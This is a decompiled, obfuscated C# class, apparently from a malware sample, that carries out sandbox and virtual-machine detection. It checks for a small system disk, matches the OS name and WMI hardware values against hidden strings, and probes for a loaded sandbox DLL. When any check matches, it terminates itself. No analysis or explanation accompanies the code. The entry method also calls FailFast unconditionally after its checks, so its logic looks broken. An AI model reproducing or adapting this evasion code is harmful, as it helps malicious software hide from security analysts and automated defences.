using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.Devices;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace jtAYXTgtXeY;

internal sealed class AeyaWBpTMZDro
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void ZgoQyHdGMwNx()
	{
		if (IuskVeIVtx() || ZQySxkFBSVswXKRf() || qFSMMOjdzXpPg() || uBRWhlIuHFgZqZ())
		{
			Process.GetCurrentProcess().Kill();
		}
		Environment.FailFast(null);
	}

	private static bool qFSMMOjdzXpPg()
	{
		try
		{
			if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= 61000000000L)
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool uBRWhlIuHFgZqZ()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (new ComputerInfo().get_OSFullName().ToLower().Contains(getString_0(107402182)))
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool IuskVeIVtx()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107402145));
			try
			{
				ManagementObjectCollection val2 = val.Get();
				try
				{
					ManagementObjectEnumerator enumerator = val2.GetEnumerator();
					try
					{
						while (enumerator.MoveNext())
						{
							ManagementBaseObject current = enumerator.get_Current();
							string text = current.get_Item(getString_0(107401616)).ToString()!.ToLower();
							if ((text == getString_0(107401567) && current.get_Item(getString_0(107401538)).ToString()!.ToUpperInvariant().Contains(getString_0(107401529))) || text.Contains(getString_0(107401548)) || current.get_Item(getString_0(107401538)).ToString() == getString_0(107401507))
							{
								return true;
							}
						}
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool ZQySxkFBSVswXKRf()
	{
		try
		{
			if (GetModuleHandle(getString_0(107401522)).ToInt32() != 0)
			{
				return true;
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string string_0);

	static AeyaWBpTMZDro()
	{
		Strings.CreateGetStringDelegate(typeof(AeyaWBpTMZDro));
	}
}
